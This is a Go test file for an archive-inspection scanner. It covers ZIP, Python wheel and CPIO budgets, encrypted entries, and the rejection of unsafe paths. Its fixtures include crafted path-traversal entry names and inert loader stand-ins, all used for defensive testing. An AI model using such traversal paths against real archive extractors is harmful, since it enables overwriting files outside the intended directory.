	if !strings.Contains(diagnostics, "encrypted.zip!install.sh: wrong zip password") {
		t.Fatalf("missing wrong-password diagnostic: %#v", result.Diagnostics)
	}
	if strings.Contains(diagnostics, "flate: corrupt input") {
		t.Fatalf("wrong password should not report low-level inflater noise: %#v", result.Diagnostics)
	}
	node := artifactNodeByLogical(result.Graph.Nodes, "encrypted.zip!install.sh")
	if node == nil || node.AnalyzeStatus != "skipped" || !strings.Contains(node.CoverageDetail, "wrong zip password") {
		t.Fatalf("wrong-password entry should be skipped with coverage: %#v", node)
	}
}

func TestZipInfersArchivedAppBundleRelationships(t *testing.T) {
	path := filepath.Join(t.TempDir(), "sample.zip")
	data := testZipEntries(t, map[string][]byte{
		"Payload/Fake.app/Contents/Info.plist": []byte(appInfoPlist("Fake")),
		"Payload/Fake.app/Contents/MacOS/Fake": []byte("#!/bin/sh\nexit 0\n"),
		"Payload/readme.txt":                   []byte("documentation\n"),
	})
	if err := os.WriteFile(path, data, 0o600); err != nil {
		t.Fatal(err)
	}

	result, err := InspectPath(path, Options{})
	if err != nil {
		t.Fatal(err)
	}
	app := artifactNodeByLogical(result.Graph.Nodes, "sample.zip!Payload/Fake.app")
	if app == nil || app.Kind != "app-bundle" || app.ParentID == "" {
		t.Fatalf("archived app bundle node missing or malformed: %#v", app)
	}
	info := artifactNodeByLogical(result.Graph.Nodes, "sample.zip!Payload/Fake.app/Contents/Info.plist")
	if info == nil || info.ParentID != app.ID {
		t.Fatalf("archived Info.plist should be parented to app bundle: %#v", info)
	}
	exe := artifactNodeByLogical(result.Graph.Nodes, "sample.zip!Payload/Fake.app/Contents/MacOS/Fake")
	if exe == nil || exe.ParentID != app.ID {
		t.Fatalf("archived executable should be parented to app bundle: %#v", exe)
	}
	if !artifactHasEdgeToLogical(result.Graph, "bundle-metadata", info.LogicalPath) {
		t.Fatalf("missing bundle-metadata edge: %#v", result.Graph.Edges)
	}
	if !artifactHasEdgeToLogical(result.Graph, "bundle-executable", exe.LogicalPath) {
		t.Fatalf("missing bundle-executable edge: %#v", result.Graph.Edges)
	}
}

func TestOversizedArchiveEntryRemainsAddressable(t *testing.T) {
	path := filepath.Join(t.TempDir(), "large-entry.zip")
	if err := os.WriteFile(path, testDeflatedZipFile(t, "payload.sh", bytes.Repeat([]byte("x"), 2048)), 0o600); err != nil {
		t.Fatal(err)
	}
	result, err := InspectPath(path, Options{MaxFileBytes: 1024, MaxCompressionRatio: 1000})
	if err != nil {
		t.Fatal(err)
	}
	node := artifactNodeByLogical(result.Graph.Nodes, "large-entry.zip!payload.sh")
	if node == nil || node.AnalyzeStatus != "skipped" || node.Size != 2048 {
		t.Fatalf("oversized archive entry should remain as a skipped node: %#v", node)
	}
	if !strings.Contains(node.CoverageDetail, "skipped entry over max file bytes 1024") {
		t.Fatalf("oversized archive node should explain skipped coverage: %#v", node)
	}
	if contentByLogical(result.Contents, "large-entry.zip!payload.sh") != nil {
		t.Fatalf("oversized archive entry should not be queued for extraction: %#v", result.Contents)
	}
}

func TestExpandedByteBudgetSpansSiblingArchives(t *testing.T) {
	root := t.TempDir()
	if err := os.WriteFile(filepath.Join(root, "a.zip"), testZipFile(t, "a.sh", bytes.Repeat([]byte("a"), 800)), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "b.zip"), testZipFile(t, "b.sh", bytes.Repeat([]byte("b"), 800)), 0o600); err != nil {
		t.Fatal(err)
	}
	result, err := InspectPath(root, Options{MaxArchiveBytes: 4096, MaxExpandedBytes: 1000, MaxFileBytes: 4096})
	if err != nil {
		t.Fatal(err)
	}
	if contentByLogical(result.Contents, filepath.Base(root)+"/a.zip!a.sh") == nil {
		t.Fatalf("first archive entry should be analyzed before global budget is exhausted")
	}
	node := artifactNodeByLogical(result.Graph.Nodes, filepath.Base(root)+"/b.zip!b.sh")
	if node == nil || node.AnalyzeStatus != "skipped" {
		t.Fatalf("second archive entry should be represented as skipped after global budget exhaustion: %#v", node)
	}
	if !strings.Contains(node.CoverageDetail, "inspection expanded-byte limit 1000 reached") {
		t.Fatalf("skipped entry should explain global archive budget exhaustion: %#v", node)
	}
	container := artifactNodeByLogical(result.Graph.Nodes, filepath.Base(root)+"/b.zip")
	if container == nil || container.AnalyzeStatus != "partial" || !strings.Contains(container.CoverageDetail, "inspection expanded-byte limit 1000 reached") {
		t.Fatalf("globally budget-stopped archive must be partial: %#v", container)
	}
}

func TestPerArchiveByteBudgetDoesNotSpanSiblingArchives(t *testing.T) {
	root := t.TempDir()
	if err := os.WriteFile(filepath.Join(root, "a.zip"), testZipFile(t, "a.sh", bytes.Repeat([]byte("a"), 800)), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, "b.zip"), testZipFile(t, "b.sh", bytes.Repeat([]byte("b"), 800)), 0o600); err != nil {
		t.Fatal(err)
	}
	result, err := InspectPath(root, Options{MaxArchiveBytes: 1000, MaxExpandedBytes: 4096, MaxFileBytes: 4096})
	if err != nil {
		t.Fatal(err)
	}
	rootName := filepath.Base(root)
	if contentByLogical(result.Contents, rootName+"/a.zip!a.sh") == nil ||
		contentByLogical(result.Contents, rootName+"/b.zip!b.sh") == nil {
		t.Fatalf("per-archive byte budget should reset for sibling archives: %#v", result.Diagnostics)
	}
}

func TestParseCPIORejectsUnsafePathsBeforeExtraction(t *testing.T) {
	data := testCPIONewc(map[string][]byte{`..\evil.sh`: []byte("echo no\n")})
	entries, diagnostics, err := parseCPIONewc(data, Options{})
	if err != nil {
		t.Fatal(err)
	}
	if len(entries) != 0 {
		t.Fatalf("unsafe CPIO entry should not be returned: %#v", entries)
	}
	if !strings.Contains(strings.Join(diagnostics, "\n"), "rejected unsafe archive path") {
		t.Fatalf("missing unsafe path diagnostic: %#v", diagnostics)
	}
}

func TestParseCPIOEnforcesEntryAndByteLimits(t *testing.T) {
	data := testCPIONewc(map[string][]byte{
		"a": bytes.Repeat([]byte("a"), 4),
		"b": bytes.Repeat([]byte("b"), 4),
	})
	entries, diagnostics, err := parseCPIONewc(data, Options{MaxArchiveBytes: 5})
	if err != nil {
		t.Fatal(err)
	}
	if len(entries) != 2 || entries[1].SkipDetail == "" {
		t.Fatalf("CPIO byte limit should retain skipped entry context, got %#v", entries)
	}
	if !strings.Contains(strings.Join(diagnostics, "\n"), "archive content byte limit") {
		t.Fatalf("missing archive byte limit diagnostic: %#v", diagnostics)
	}

	data = testCPIONewc(map[string][]byte{"large": bytes.Repeat([]byte("x"), 8)})
	entries, diagnostics, err = parseCPIONewc(data, Options{MaxFileBytes: 4})
	if err != nil {
		t.Fatal(err)
	}
	if len(entries) != 1 || entries[0].SkipDetail == "" {
		t.Fatalf("oversized CPIO entry should be represented as skipped: %#v", entries)
	}
	if !strings.Contains(strings.Join(diagnostics, "\n"), "skipped entry over max file bytes") {
		t.Fatalf("missing max-file diagnostic: %#v", diagnostics)
	}
}

func TestParseCPIOEnforcesEntryLimitForSkippedEntries(t *testing.T) {
	files := make(map[string][]byte, MaxArchiveEntries+1)
	for i := 0; i < MaxArchiveEntries+1; i++ {
		files[fmt.Sprintf("../evil-%04d", i)] = nil
	}
	entries, diagnostics, err := parseCPIONewc(testCPIONewc(files), Options{})
	if err != nil {
		t.Fatal(err)
	}
	if len(entries) != 0 {
		t.Fatalf("unsafe entries should not be returned: %#v", entries)
	}
	got := strings.Join(diagnostics, "\n")
	if !strings.Contains(got, "archive entry limit") {
		t.Fatalf("missing entry limit diagnostic: %#v", diagnostics)
	}
}

func TestParseCPIOReportsMissingTrailerAfterEntries(t *testing.T) {
	data := appendCPIOTestEntry(nil, 1, 0o100755, "install.sh", []byte("echo ok\n"))
	entries, diagnostics, err := parseCPIONewc(data, Options{})
	if err != nil {
		t.Fatal(err)
	}
	if len(entries) != 1 {
		t.Fatalf("valid entries before missing trailer should be retained: %#v", entries)
	}
	if !strings.Contains(strings.Join(diagnostics, "\n"), "ended before trailer") {
		t.Fatalf("missing truncated archive diagnostic: %#v", diagnostics)
	}
}

func TestParseCPIOOdcExtractsOldASCIIArchive(t *testing.T) {
	data := testCPIOOdc(map[string][]byte{"postinstall": []byte("#!/bin/sh\necho ok\n")})
	entries, diagnostics, err := parseCPIO(data, Options{})
	if err != nil {
		t.Fatal(err)
	}
	if len(diagnostics) != 0 {
		t.Fatalf("unexpected diagnostics: %#v", diagnostics)
	}
	if len(entries) != 1 {
		t.Fatalf("entries = %#v", entries)
	}
	if entries[0].Name != "postinstall" || string(entries[0].Data) != "#!/bin/sh\necho ok\n" || !entries[0].Executable {
		t.Fatalf("unexpected odc entry: %#v", entries[0])
	}
}

func testZipFile(t *testing.T, name string, data []byte) []byte {
	t.Helper()
	var out bytes.Buffer
	zw := zip.NewWriter(&out)
	header := &zip.FileHeader{Name: name, Method: zip.Store}
	w, err := zw.CreateHeader(header)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := w.Write(data); err != nil {
		t.Fatal(err)
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	return out.Bytes()
}

func testDeflatedZipFile(t *testing.T, name string, data []byte) []byte {
	t.Helper()
	var out bytes.Buffer
	zw := zip.NewWriter(&out)
	header := &zip.FileHeader{Name: name, Method: zip.Deflate}
	w, err := zw.CreateHeader(header)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := w.Write(data); err != nil {
		t.Fatal(err)
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	return out.Bytes()
}

func testZipEntries(t *testing.T, entries map[string][]byte) []byte {
	t.Helper()
	var names []string
	for name := range entries {
		names = append(names, name)
	}
	sort.Strings(names)
	var out bytes.Buffer
	zw := zip.NewWriter(&out)
	for _, name := range names {
		header := &zip.FileHeader{Name: name, Method: zip.Store}
		if strings.Contains(name, "/Contents/MacOS/") {
			header.SetMode(0o755)
		}
		w, err := zw.CreateHeader(header)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := w.Write(entries[name]); err != nil {
			t.Fatal(err)
		}
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	return out.Bytes()
}

func testOrderedZipEntries(t *testing.T, entries []struct {
	name string
	data []byte
}) []byte {
	t.Helper()
	var out bytes.Buffer
	zw := zip.NewWriter(&out)
	for _, entry := range entries {
		w, err := zw.CreateHeader(&zip.FileHeader{Name: entry.name, Method: zip.Store})
		if err != nil {
			t.Fatal(err)
		}
		if _, err := w.Write(entry.data); err != nil {
			t.Fatal(err)
		}
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	return out.Bytes()
}

func TestPythonWheelPrioritizesActivationAndShallowSourceWithinBudget(t *testing.T) {
	archive := testOrderedZipEntries(t, []struct {
		name string
		data []byte
	}{
		{name: "pkg/native.abi3.so", data: bytes.Repeat([]byte("N"), 400)},
		{name: "pkg/data/generated.py", data: bytes.Repeat([]byte("G"), 400)},
		{name: "pkg/__init__.py", data: []byte("from . import _payload\n")},
		{name: "pkg/_payload.js", data: []byte("require('child_process').spawn('/usr/bin/true', []);\n")},
		{name: "pkg-1.0.dist-info/WHEEL", data: []byte("Wheel-Version: 1.0\n")},
	})
	options := Options{
		MaxArchiveBytes:     256,
		MaxExpandedBytes:    256,
		MaxFileBytes:        4096,
		MaxCompressionRatio: 100,
	}
	first, err := InspectBytes("fixture.whl", archive, options)
	if err != nil {
		t.Fatal(err)
	}
	second, err := InspectBytes("fixture.whl", archive, options)
	if err != nil {
		t.Fatal(err)
	}
	for _, logical := range []string{
		"fixture.whl!pkg/__init__.py",
		"fixture.whl!pkg/_payload.js",
		"fixture.whl!pkg-1.0.dist-info/WHEEL",
	} {
		if contentByLogical(first.Contents, logical) == nil {
			t.Fatalf("priority wheel member %q was starved by bulky earlier members: diagnostics=%#v", logical, first.Diagnostics)
		}
	}
	for _, logical := range []string{"fixture.whl!pkg/native.abi3.so", "fixture.whl!pkg/data/generated.py"} {
		node := artifactNodeByLogical(first.Graph.Nodes, logical)
		if node == nil || node.AnalyzeStatus != "skipped" || !strings.Contains(node.CoverageDetail, "archive content byte limit 256") {
			t.Fatalf("budgeted wheel member %q did not retain explicit skipped coverage: %#v", logical, node)
		}
	}
	if !reflect.DeepEqual(first, second) {
		t.Fatal("wheel priority traversal is not deterministic")
	}
}

func TestPythonWheelPriorityRetainsActivationNativeAndShallowSourceLanes(t *testing.T) {
	archive := testOrderedZipEntries(t, []struct {
		name string
		data []byte
	}{
		{name: "pkg/generated-dataset.bin", data: bytes.Repeat([]byte("D"), 400)},
		{name: "pkg/native.abi3.so", data: bytes.Repeat([]byte("N"), 180)},
		{name: "pkg/loader.js", data: []byte("require('child_process').spawn('/usr/bin/true', []);\n")},
		{name: "pkg/__init__.py", data: []byte("from . import loader\n")},
		{name: "startup.pth", data: []byte("import harmless_startup\n")},
		{name: "pkg-1.0.dist-info/WHEEL", data: []byte("Wheel-Version: 1.0\n")},
	})
	result, err := InspectBytes("fixture.whl", archive, Options{
		MaxArchiveBytes:     320,
		MaxExpandedBytes:    320,
		MaxFileBytes:        4096,
		MaxCompressionRatio: 100,
	})
	if err != nil {
		t.Fatal(err)
	}
	for _, logical := range []string{
		"fixture.whl!pkg-1.0.dist-info/WHEEL",
		"fixture.whl!startup.pth",
		"fixture.whl!pkg/__init__.py",
		"fixture.whl!pkg/native.abi3.so",
		"fixture.whl!pkg/loader.js",
	} {
		if contentByLogical(result.Contents, logical) == nil {
			t.Fatalf("balanced wheel traversal did not retain %q: diagnostics=%#v", logical, result.Diagnostics)
		}
	}
	data := artifactNodeByLogical(result.Graph.Nodes, "fixture.whl!pkg/generated-dataset.bin")
	if data == nil || data.AnalyzeStatus != "skipped" || !strings.Contains(data.CoverageDetail, "archive content byte limit 320") {
		t.Fatalf("lower-priority oversized data did not remain an explicit skip: %#v", data)
	}
}

func TestPythonWheelPriorityPreservesEquivalentNativeMemberOrder(t *testing.T) {
	archive := testOrderedZipEntries(t, []struct {
		name string
		data []byte
	}{
		{name: "pkg/first.abi3.so", data: bytes.Repeat([]byte("F"), 240)},
		{name: "pkg/second.abi3.so", data: bytes.Repeat([]byte("S"), 100)},
		{name: "pkg/loader.js", data: []byte("fetch('https://benign.invalid/');\n")},
		{name: "pkg-1.0.dist-info/WHEEL", data: []byte("Wheel-Version: 1.0\n")},
	})
	result, err := InspectBytes("fixture.whl", archive, Options{
		MaxArchiveBytes:     300,
		MaxExpandedBytes:    300,
		MaxFileBytes:        4096,
		MaxCompressionRatio: 100,
	})
	if err != nil {
		t.Fatal(err)
	}
	if contentByLogical(result.Contents, "fixture.whl!pkg/first.abi3.so") == nil {
		t.Fatalf("first equivalent native member was displaced by size ordering: %#v", result.Contents)
	}
	second := artifactNodeByLogical(result.Graph.Nodes, "fixture.whl!pkg/second.abi3.so")
	if second == nil || second.AnalyzeStatus != "skipped" {
		t.Fatalf("second over-budget native member lacks explicit skipped coverage: %#v", second)
	}
	if contentByLogical(result.Contents, "fixture.whl!pkg/loader.js") == nil {
		t.Fatalf("later shallow source was not considered after a skipped native member: %#v", result.Contents)
	}
}

func TestOrdinaryZIPRetainsCentralDirectoryInspectionOrder(t *testing.T) {
	archive := testOrderedZipEntries(t, []struct {
		name string
		data []byte
	}{
		{name: "large.bin", data: bytes.Repeat([]byte("L"), 220)},
		{name: "pkg/__init__.py", data: bytes.Repeat([]byte("I"), 30)},
		{name: "pkg/_payload.js", data: bytes.Repeat([]byte("J"), 30)},
	})
	result, err := InspectBytes("fixture.zip", archive, Options{
		MaxArchiveBytes:     250,
		MaxExpandedBytes:    250,
		MaxFileBytes:        4096,
		MaxCompressionRatio: 100,
	})
	if err != nil {
		t.Fatal(err)
	}
	if contentByLogical(result.Contents, "fixture.zip!large.bin") == nil || contentByLogical(result.Contents, "fixture.zip!pkg/__init__.py") == nil {
		t.Fatalf("ordinary ZIP did not retain central-directory budget order: %#v", result.Contents)
	}
	payload := artifactNodeByLogical(result.Graph.Nodes, "fixture.zip!pkg/_payload.js")
	if payload == nil || payload.AnalyzeStatus != "skipped" {
		t.Fatalf("ordinary ZIP was unexpectedly given wheel-specific priority: %#v", payload)
	}
}

func TestZIPProcessingLimitMarksArchivePartial(t *testing.T) {
	var out bytes.Buffer
	zw := zip.NewWriter(&out)
	for i := 0; i < MaxArchiveEntries+1; i++ {
		if _, err := zw.CreateHeader(&zip.FileHeader{
			Name:   fmt.Sprintf("entry-%05d", i),
			Method: zip.Store,
		}); err != nil {
			t.Fatal(err)
		}
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}

	s := scanner{options: Options{}.normalized()}
	parentID := s.graph.AddNode(Node{LogicalPath: "sample.zip", Kind: "zip", AnalyzeStatus: "analyzed"})
	s.scanZip(parentID, "sample.zip", out.Bytes(), 1)

	parent := artifactNodeByLogical(s.graph.Nodes, "sample.zip")
	if parent == nil || parent.AnalyzeStatus != "partial" || !strings.Contains(parent.CoverageDetail, "processing limit 4096") {
		t.Fatalf("entry-limited ZIP should mark its parent partial: %#v", parent)
	}
	if !strings.Contains(strings.Join(s.diagnostics, "\n"), "remaining entries were not inspected") {
		t.Fatalf("entry-limited ZIP should explain the omitted remainder: %#v", s.diagnostics)
	}
}

func TestZIPBudgetSkipsLargeMemberAndContinuesWithLaterSiblings(t *testing.T) {
	var out bytes.Buffer
	zw := zip.NewWriter(&out)
	for _, entry := range []struct {
		name string
		data []byte
	}{
		{name: "00-large.bin", data: []byte("123456789")},
		{name: "01-launcher.sh", data: []byte("echo")},
	} {
		writer, err := zw.CreateHeader(&zip.FileHeader{Name: entry.name, Method: zip.Store})
		if err != nil {
			t.Fatal(err)
		}
		if _, err := writer.Write(entry.data); err != nil {
			t.Fatal(err)
		}
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}

	s := scanner{options: Options{MaxArchiveBytes: 8, MaxExpandedBytes: 64}.normalized()}
	parentID := s.graph.AddNode(Node{LogicalPath: "sample.zip", Kind: "zip", AnalyzeStatus: "analyzed"})
	s.scanZip(parentID, "sample.zip", out.Bytes(), 1)

	large := artifactNodeByLogical(s.graph.Nodes, "sample.zip!00-large.bin")
	if large == nil || large.AnalyzeStatus != "skipped" || !strings.Contains(large.CoverageDetail, "archive content byte limit 8") {
		t.Fatalf("large first member should be retained as skipped: %#v", large)
	}
	launcher := artifactNodeByLogical(s.graph.Nodes, "sample.zip!01-launcher.sh")
	if launcher == nil || launcher.AnalyzeStatus != "analyzed" {
		t.Fatalf("later small sibling should still be inspected: %#v", launcher)
	}
	parent := artifactNodeByLogical(s.graph.Nodes, "sample.zip")
	if parent == nil || parent.AnalyzeStatus != "partial" || !strings.Contains(parent.CoverageDetail, "archive content byte limit 8") {
		t.Fatalf("member omission should mark ZIP partial: %#v", parent)
	}
}

func TestZIPPreflightFailureMarksArchivePartial(t *testing.T) {
	s := scanner{options: Options{}.normalized()}
	parentID := s.graph.AddNode(Node{LogicalPath: "sample.zip", Kind: "zip", AnalyzeStatus: "analyzed"})
	s.scanZip(parentID, "sample.zip", []byte("not a zip"), 1)

	parent := artifactNodeByLogical(s.graph.Nodes, "sample.zip")
	if parent == nil || parent.AnalyzeStatus != "partial" || !strings.Contains(parent.CoverageDetail, "ZIP structure validation failed") {
		t.Fatalf("ZIP structure-validation failure should be structured coverage: %#v", parent)
	}
}

func TestBundledGoDistributionRolesExcludeOnlySDKSubtrees(t *testing.T) {
	entries := []VirtualEntry{
		{Name: "bin/go"},
		{Name: "pkg/tool/darwin_arm64/compile"},
		{Name: "src/runtime/runtime.go"},
		{Name: "misc/wasm/wasm_exec.js"},
		{Name: "MediaPatcher.app/Contents/MacOS/MediaPatcher"},
		{Name: "drivfixer.sh"},
	}
	markBundledGoDistributionRoles(entries)
	for index := 0; index < 4; index++ {
		if entries[index].SourceRole != "vendor/toolchain" {
			t.Fatalf("Go SDK entry %q role = %q, want vendor/toolchain", entries[index].Name, entries[index].SourceRole)
		}
	}
	for index := 4; index < len(entries); index++ {
		if entries[index].SourceRole != "" {
			t.Fatalf("adjacent payload %q was incorrectly reclassified: %q", entries[index].Name, entries[index].SourceRole)
		}
	}
}

func TestBundledGoDistributionRolesRequireToolchainMarkers(t *testing.T) {
	entries := []VirtualEntry{{Name: "bin/go"}, {Name: "src/runtime/runtime.go"}, {Name: "src/payload.go"}}
	markBundledGoDistributionRoles(entries)
	for _, entry := range entries {
		if entry.SourceRole != "" {
			t.Fatalf("incomplete SDK markers reclassified %q as %q", entry.Name, entry.SourceRole)
		}
	}
}

func testEncryptedZipFile(t *testing.T, name string, data []byte) []byte {
	t.Helper()
	out := testZipFile(t, name, data)
	if len(out) < 8 || binary.LittleEndian.Uint32(out[0:4]) != 0x04034b50 {
		t.Fatal("test zip missing local header")
	}
	flags := binary.LittleEndian.Uint16(out[6:8])
	binary.LittleEndian.PutUint16(out[6:8], flags|0x1)
	for offset := 0; offset+10 <= len(out); offset++ {
		if binary.LittleEndian.Uint32(out[offset:offset+4]) != 0x02014b50 {
			continue
		}
		flags := binary.LittleEndian.Uint16(out[offset+8 : offset+10])
		binary.LittleEndian.PutUint16(out[offset+8:offset+10], flags|0x1)
		return out
	}
	t.Fatal("test zip missing central directory header")
	return nil
}

func testClassicEncryptedZipFile(t *testing.T, name string, data []byte, password string, method uint16) []byte {
	t.Helper()
	var compressed bytes.Buffer
	switch method {
	case zip.Store:
		compressed.Write(data)
	case zip.Deflate:
		fw, err := flate.NewWriter(&compressed, flate.DefaultCompression)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := fw.Write(data); err != nil {
			t.Fatal(err)
		}
		if err := fw.Close(); err != nil {
			t.Fatal(err)
		}
	default:
		t.Fatalf("unsupported test zip method %d", method)
	}
	crc := crc32.ChecksumIEEE(data)
	header := make([]byte, zipCryptoHeaderSize)
	header[zipCryptoHeaderSize-1] = byte(crc >> 24)
	encrypted := testZipCryptoEncrypt([]byte(password), append(header, compressed.Bytes()...))
	nameBytes := []byte(name)
	var out bytes.Buffer
	writeZipLocalHeader(&out, nameBytes, method, crc, uint32(len(encrypted)), uint32(len(data)))
	out.Write(nameBytes)
	out.Write(encrypted)
	centralOffset := out.Len()
	writeZipCentralHeader(&out, nameBytes, method, crc, uint32(len(encrypted)), uint32(len(data)))
	centralSize := out.Len() - centralOffset
	writeZipEOCD(&out, uint32(centralSize), uint32(centralOffset))
	return out.Bytes()
}

func testZipCryptoEncrypt(password, data []byte) []byte {
	keys := newZipCryptoKeys(password)
	out := make([]byte, len(data))
	for i, plain := range data {
		cipher := plain ^ keys.byte()
		keys.update(plain)
		out[i] = cipher
	}
	return out
}

func writeZipLocalHeader(out *bytes.Buffer, name []byte, method uint16, crc, compressed, uncompressed uint32) {
	writeTestBinary(out, uint32(0x04034b50))
	writeTestBinary(out, uint16(20))
	writeTestBinary(out, uint16(0x1))
	writeTestBinary(out, method)
	writeTestBinary(out, uint16(0))
	writeTestBinary(out, uint16(0))
	writeTestBinary(out, crc)
	writeTestBinary(out, compressed)
	writeTestBinary(out, uncompressed)
	writeTestBinary(out, uint16(len(name)))
	writeTestBinary(out, uint16(0))
}

func writeZipCentralHeader(out *bytes.Buffer, name []byte, method uint16, crc, compressed, uncompressed uint32) {
	for _, value := range []any{
		uint32(0x02014b50), uint16(20), uint16(20), uint16(0x1), method,
		uint16(0), uint16(0), crc, compressed, uncompressed, uint16(len(name)),
		uint16(0), uint16(0), uint16(0), uint16(0), uint32(0), uint32(0),
	} {
		writeTestBinary(out, value)
	}
	out.Write(name)
}

func writeZipEOCD(out *bytes.Buffer, centralSize, centralOffset uint32) {
	for _, value := range []any{
		uint32(0x06054b50), uint16(0), uint16(0), uint16(1), uint16(1), centralSize, centralOffset, uint16(0),
	} {
		writeTestBinary(out, value)
	}
}

func writeTestBinary(out *bytes.Buffer, value any) {
	if err := binary.Write(out, binary.LittleEndian, value); err != nil {
		panic(err)
	}
}

func testZipSymlink(t *testing.T, name, target string) []byte {
	t.Helper()
	var out bytes.Buffer
	zw := zip.NewWriter(&out)
	header := &zip.FileHeader{Name: name, Method: zip.Store}
	header.SetMode(os.ModeSymlink | 0o777)
	w, err := zw.CreateHeader(header)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := w.Write([]byte(target)); err != nil {
		t.Fatal(err)
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	return out.Bytes()
}

func testZipEmptyFile(t *testing.T, name string) []byte {
	t.Helper()
	var out bytes.Buffer
	zw := zip.NewWriter(&out)
	header := &zip.FileHeader{Name: name, Method: zip.Store}
	header.SetMode(0o755)
	if _, err := zw.CreateHeader(header); err != nil {
		t.Fatal(err)
	}
	if err := zw.Close(); err != nil {
		t.Fatal(err)
	}
	return out.Bytes()
}

func testTarSymlink(t *testing.T, name, target string) []byte {
	t.Helper()
	var out bytes.Buffer
	tw := tar.NewWriter(&out)
	if err := tw.WriteHeader(&tar.Header{Name: name, Typeflag: tar.TypeSymlink, Linkname: target, Mode: 0o777}); err != nil {
		t.Fatal(err)
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	return out.Bytes()
}

func testTarHardlink(t *testing.T, name, target string) []byte {
	t.Helper()
	var out bytes.Buffer
	tw := tar.NewWriter(&out)
	if err := tw.WriteHeader(&tar.Header{Name: name, Typeflag: tar.TypeLink, Linkname: target, Mode: 0o777}); err != nil {
		t.Fatal(err)
	}
	if err := tw.Close(); err != nil {
		t.Fatal(err)
	}
	return out.Bytes()
}

func testCPIOSymlink(name, target string) []byte {
	var out []byte
	out = appendCPIOTestEntry(out, 1, 0o120777, name, []byte(target))
	return appendCPIOTestEntry(out, 2, 0, "TRAILER!!!", nil)
}

func testCPIONewc(files map[string][]byte) []byte {
	names := make([]string, 0, len(files))
	for name := range files {
		names = append(names, name)
	}
	sort.Strings(names)
	var out []byte
	for i, name := range names {
		out = appendCPIOTestEntry(out, uint64(i+1), 0o100755, name, files[name])
	}
	return appendCPIOTestEntry(out, uint64(len(names)+1), 0, "TRAILER!!!", nil)
}

func testCPIOOdc(files map[string][]byte) []byte {
	names := make([]string, 0, len(files))
	for name := range files {
		names = append(names, name)
	}
	sort.Strings(names)
	var out []byte
	for i, name := range names {
		out = appendCPIOOdcTestEntry(out, uint64(i+1), 0o100755, name, files[name])
	}
	return appendCPIOOdcTestEntry(out, uint64(len(names)+1), 0, "TRAILER!!!", nil)
}

func appendCPIOTestEntry(out []byte, ino, mode uint64, name string, data []byte) []byte {
	header := fmt.Sprintf(
		"070701%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x%08x",
		ino,
		mode,
		0,
		0,
		1,
		0,
		len(data),
		0,
		0,
		0,
		0,
		len(name)+1,
		0,
	)
	out = append(out, []byte(header)...)
	out = append(out, []byte(name)...)
	out = append(out, 0)
	out = alignCPIOTest(out)
	out = append(out, data...)
	return alignCPIOTest(out)
}

func appendCPIOOdcTestEntry(out []byte, ino, mode uint64, name string, data []byte) []byte {
	header := fmt.Sprintf(
		"070707%06o%06o%06o%06o%06o%06o%06o%011o%06o%011o",
		0,
		ino,
		mode,
		0,
		0,
		1,
		0,
		0,
		len(name)+1,
		len(data),
	)
	out = append(out, []byte(header)...)
	out = append(out, []byte(name)...)
	out = append(out, 0)
	out = append(out, data...)
	return out
}

func alignCPIOTest(out []byte) []byte {
	for len(out)%4 != 0 {
		out = append(out, 0)
	}
	return out
}

func writeTestAsar(files map[string][]byte) ([]byte, error) {
	type fileHeader struct {
		Offset string `json:"offset"`
		Size   int    `json:"size"`
	}
	type dirHeader struct {
		Files map[string]any `json:"files"`
	}
	root := dirHeader{Files: map[string]any{}}
	names := make([]string, 0, len(files))
	for name := range files {
		names = append(names, name)
	}
	sort.Strings(names)
	var payload bytes.Buffer
	offset := 0
	for _, name := range names {
		addAsarTestHeader(root.Files, splitSlash(name), fileHeader{Offset: strconv.Itoa(offset), Size: len(files[name])})
		payload.Write(files[name])
		offset += len(files[name])
	}
	headerJSON, err := json.Marshal(root)
	if err != nil {
		return nil, err
	}
	return writeTestAsarRaw(json.RawMessage(headerJSON), payload.Bytes())
}

func writeTestAsarRaw(header any, payload []byte) ([]byte, error) {
	headerJSON, err := json.Marshal(header)
	if err != nil {
		return nil, err
	}
	alignedJSONSize := (len(headerJSON) + 3) &^ 3
	headerPickle := make([]byte, 8+alignedJSONSize)
	binary.LittleEndian.PutUint32(headerPickle[0:4], uint32(alignedJSONSize+4))
	binary.LittleEndian.PutUint32(headerPickle[4:8], uint32(len(headerJSON)))
	copy(headerPickle[8:], headerJSON)
	sizePickle := make([]byte, 8)
	binary.LittleEndian.PutUint32(sizePickle[0:4], 4)
	binary.LittleEndian.PutUint32(sizePickle[4:8], uint32(len(headerPickle)))
	out := append(sizePickle, headerPickle...)
	out = append(out, payload...)
	return out, nil
}

func testAsarWithHeaderJSON(t *testing.T, headerJSON []byte) []byte {
	t.Helper()
	alignedJSONSize := (len(headerJSON) + 3) &^ 3
	headerPickle := make([]byte, 8+alignedJSONSize)
	binary.LittleEndian.PutUint32(headerPickle[0:4], uint32(alignedJSONSize+4))
	binary.LittleEndian.PutUint32(headerPickle[4:8], uint32(len(headerJSON)))
	copy(headerPickle[8:], headerJSON)
	sizePickle := make([]byte, 8)
	binary.LittleEndian.PutUint32(sizePickle[0:4], 4)
	binary.LittleEndian.PutUint32(sizePickle[4:8], uint32(len(headerPickle)))
	return append(sizePickle, headerPickle...)
}

func splitSlash(path string) []string {
	var out []string
	for _, part := range bytes.Split([]byte(path), []byte("/")) {
		if len(part) > 0 {
			out = append(out, string(part))
		}
	}
	return out
}

func addAsarTestHeader(root map[string]any, parts []string, file any) {
	if len(parts) == 1 {
		root[parts[0]] = file
		return
	}
	child, ok := root[parts[0]].(map[string]any)
	if !ok {
		child = map[string]any{}
